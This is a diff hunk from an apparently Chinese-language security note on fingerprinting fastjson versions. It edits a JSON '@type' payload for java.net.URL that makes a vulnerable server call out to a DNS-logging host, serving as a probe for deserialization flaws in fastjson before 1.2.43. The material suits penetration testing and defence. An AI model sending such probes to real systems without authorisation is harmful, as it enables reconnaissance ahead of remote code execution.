@@ -40,7 +40,7 @@ fastjson探测版本，还可以用错误格式的json发过去。如果对方�
 fastjson <1.2.43
 
 ```java
-{"@type":"java.net.URL","val":"dnslog"}
+{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
 ```
 
 fastjson <1.2.48
